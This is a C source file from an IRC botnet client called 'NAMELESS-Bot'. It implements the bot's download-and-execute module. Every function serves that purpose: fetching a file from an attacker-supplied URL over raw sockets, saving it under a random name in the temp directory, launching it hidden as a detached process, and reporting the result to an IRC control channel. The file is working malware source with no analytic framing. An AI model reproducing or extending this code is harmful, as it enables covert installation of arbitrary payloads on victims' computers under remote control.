/*
            [ N A M E L E S S - Bot ]
            [       by: Carve       ]

            Thanks To; The Rogue & t0nix
*/

#include "global.h"

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

int Wget_GetFile(SOCKET sock, char *destination)
{
	FILE	*f;
	char	buff[2] = {0};
	int		i, len = 0;


	f = fopen(destination, "wb");
	if (f == NULL)
		return -8;

	while ((i = my_recv(sock, buff, 1, 0)) > 0)
	{
		fwrite(buff, 1, 1, f);
		buff[0] = 0;
		len += i;
	}

	fclose(f);

	return len;
}


int Wget_ProcessHTTP(SOCKET sock, char *destination)
{
	char		buffer[1024];
	int			len = 0;

	while ((len += my_recv(sock, buffer + len, 1, 0)) > 0)
	{
		if (strstr(buffer, "\r\n\r\n") != NULL)
			return Wget_GetFile(sock, destination);
		else if (len == 1024)
			break;
	}

	return -7;
}


int Wget_HTTP(char *host, char *file, char *destination)
{
	char				buffer[MAX_LINE];
	unsigned int		resv_host;
	struct sockaddr_in	address;
	SOCKET				sock;
	int					fsize;

	_snprintf(buffer, sizeof(buffer) - 1, "GET /%s HTTP/1.1\r\n"
										  "Host: %s\r\n"
									  	  "User-Agent: %s\r\n"
										  "Keep-Alive: 300\r\n"
										  "Connection: keep-alive\r\n\r\n",
										  file, host, useragent);

	resv_host = Resolve_This_Host(host);
	if (resv_host == 0)
		return -4;

	address.sin_addr.s_addr = resv_host;
	address.sin_family = AF_INET;
	address.sin_port = my_htons(80);

	if ((sock = my_socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET)
		return -5;

	if (my_connect(sock, (struct sockaddr *)&address, sizeof(address)) == SOCKET_ERROR)
		return -6;

	my_send(sock, buffer, strlen(buffer), 0);

	_snprintf(destination, sizeof(destination) - 1, "C:\\%s.zip", Create_Random_Letter(6));

	fsize = Wget_ProcessHTTP(sock, destination);

	my_closesocket(sock);

	return fsize;
}


int Wget_Main(char *url, char *destination)
{
	char	host[128],
			file[128],
			*pch;

	// check if its http or ftp protocol
	// ftp not supported yet!
	pch = strtok(url, "/");
	if (strcmp(pch, "http:"))
		return -1;

	pch = strtok(NULL, "/");
	if (pch == NULL)
		return -2;
	else
		_snprintf(host, sizeof(host) - 1, "%s", pch);

	pch = strtok(NULL, "");
	if (pch == NULL)
		return -3;
	else
		_snprintf(file, sizeof(file) - 1, "%s", pch);

	return Wget_HTTP(host, file, destination);
}


int Wget_RunOrRemove(char *destination, int mode)
{
	PROCESS_INFORMATION		p;
	STARTUPINFO				s;

	memset(&p, 0, sizeof(p));
	memset(&s, 0, sizeof(s));
	s.lpTitle = "";
	s.cb = sizeof(s);
	s.dwFlags = STARTF_USESHOWWINDOW;
	s.wShowWindow = SW_HIDE;

	if (!my_CreateProcess(NULL, destination, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &s, &p))
		return 0;

	CloseHandle(p.hProcess);
	CloseHandle(p.hThread);

	if (mode == 2)
	{
		//SC_StopOrUninstall(TRUE);
		return 2;
	}
	else
		return 1;
}


DWORD WINAPI Wget_Thread(LPVOID param)
{
	int					ret, e = 0;
	char				buffer[MAX_LINE];
	download_s			dl = *((download_s *)param);

	// fix destination
	if (dl.destination[0] == 0)
	{
		char	temp[MAX_PATH], *pch;

		GetTempPath(sizeof(temp), temp);
		pch = strrchr(dl.url, '.');
		if (pch != NULL)
			_snprintf(dl.destination, sizeof(dl.destination) - 1, "%s%s%s", temp, Create_Random_Letter(3), pch);
		else
			_snprintf(dl.destination, sizeof(dl.destination) - 1, "%s%s.exe", temp, Create_Random_Letter(3));
	}

	// dont need these (only for debugging)
	//_snprintf(buffer, sizeof(buffer) - 1, "saving: %s to: %s", dl.url, dl.destination);
	Node_Send(dl.ircsock, MSG_PRIVMSG, buffer, dl.channel);
	memset(buffer, 0, sizeof(buffer));


	ret = Wget_Main(dl.url, dl.destination);

	if (ret <= 0)
		_snprintf(buffer, sizeof(buffer) - 1, "error! (%d).",ret);

	else
	{
		if (dl.mode == 1 || dl.mode == 2)
		{
			e = Wget_RunOrRemove(dl.destination, dl.mode);
			switch (e)
			{
			case 0:
				//_snprintf(buffer, sizeof(buffer) - 1, "couldn't start: %d [kB]",ret/1024);
				break;
			case 1:
				_snprintf(buffer, sizeof(buffer) - 1, "running: %d [kB]",ret/1024);
				break;
			case 2:
				//_snprintf(buffer, sizeof(buffer) - 1, "removing..");
				break;
			default:
				_snprintf(buffer, sizeof(buffer) - 1, "unknown error!");
				break;
			}
		}
		else
			_snprintf(buffer, sizeof(buffer) - 1, "finished: %d [kB]",ret/1024);
	}

	Node_Send(dl.ircsock, MSG_PRIVMSG, buffer, dl.channel);
	memset(buffer, 0, sizeof(buffer));

	if (e == 2)
	{
		my_WSACleanup();
		ExitProcess(0);
	}

	Thread_Clear(dl.tnum);
	ExitThread(0);
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

